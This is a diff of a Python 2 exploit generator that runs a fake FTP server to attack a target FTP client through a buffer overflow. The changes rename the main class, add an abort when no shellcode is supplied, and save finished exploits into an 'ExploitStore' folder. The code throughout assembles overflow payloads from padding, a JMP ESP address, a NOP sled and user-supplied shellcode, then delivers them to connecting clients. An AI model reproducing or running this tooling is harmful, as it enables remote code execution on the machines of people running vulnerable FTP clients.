@@ -18,7 +18,7 @@ B='\033[34m'
 P= '\033[35m'   
 Y="\033[1;33m" 
 
-class SERVER_BUFFER():
+class LISTEN_BIND():
         
       def __init__(self): 
             
@@ -33,13 +33,13 @@ class SERVER_BUFFER():
                  shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()')
              mode = """
                        ========================                          
-                         Target FTP Clinet
+                         Target  FTP Clinet
                        ========================
                                """
              print R+mode+W          
              time.sleep(2)
              time.sleep(2)
-             self.app_name = str(raw_input(O+"\n[?]"+W+B+" Enter The Application Name you Try Exploit : "+W))         
+             self.app_name = str(raw_input(O+"\n[?]"+W+B+"application name  : "+W))         
              self.string_ramd() 
              self.Listen_FAKE()
              self.connect_client()
@@ -176,7 +176,7 @@ class SERVER_BUFFER():
                 from Bad_Character import Bad_Character_Clinet             
                 run = Bad_Character_Clinet()
             elif bad_op ==Bad_no and len(Bad_no)==2: 
-		print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
+		print R+"\n\t\t!___To Continue Exploit Generate shellcode and post it in shell_code.py file___! \n"+W 
                 pass
             else:
               print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
@@ -220,6 +220,12 @@ class SERVER_BUFFER():
                  print Y+'\n[+]'+W+B+'attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ "A"+W+O+'+'+W+B+\
                  ' JMP ESP ='+W,Y+self.display+W,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O+'+'+W+P+' shellcode'+W
                  time.sleep(2)
+                 if len(shell_code) < 50:
+                        print P+"\n\t\t\t\t!__________________EXPLOIT__Fail__________________!"+W
+                        print B+"\n\t\t\t!__________________Dedicated_No_Shell_Code______________________!"+W
+                        exit()
+                 else:
+                    pass       
                  connect_Attack= self.Listen_FAKE()                                                           
                  client , addr = self.listen_sock.accept()
                  time.sleep(2)
@@ -232,7 +238,7 @@ class SERVER_BUFFER():
                         except Exception:
                            print B+"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                            time.sleep(2)
-                           print Y+"\n[+]"+W+R+"________________Expolit Done _______________ "+W+B+"***!!!"+W          
+                           print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W          
                            break
              except KeyboardInterrupt:
                    Banner  
@@ -243,8 +249,8 @@ class SERVER_BUFFER():
                   shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                   self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
-                  copy_format= shutil.copy("./FTP.Client_payload.txt","./FTP.Client_paylaod.py")
-                  file="FTP.Client_paylaod.py"
+                  copy_format= shutil.copy("./TemplateExploit/FTP.Client_payload.txt",'./ExploitStore/'+self.app_name+"_Exploit.py")
+                  file= './ExploitStore/'+self.app_name+"_Exploit.py"
                   for line in fileinput.FileInput(file,inplace=1):
 	                if '# application name :'in line:
 		            line = line.rstrip()
@@ -267,7 +273,7 @@ class SERVER_BUFFER():
 				
 		        print line,
 		  time.sleep(2)
-		  print O+"\n <<<<>>>>>>"+W+R+"The Final Process of this Exploit Written in the File "+W+Y+"'FTP.Server_Paylaod.py'"+W+O+"<<<>>>> "+W 
+		  print O+"\n\t!_________The Final Process of this Exploit Written in to "+W,Y+"'ExploitStore'"+W,O+"Folder________!"+W
 		  time.sleep(2)     
                   print   Banner
                   exit() 
@@ -276,4 +282,4 @@ class SERVER_BUFFER():
                      exit()
                        
 if __name__ == '__main__': 
-  SERVER_BUFFER()
+  LISTEN_BIND()
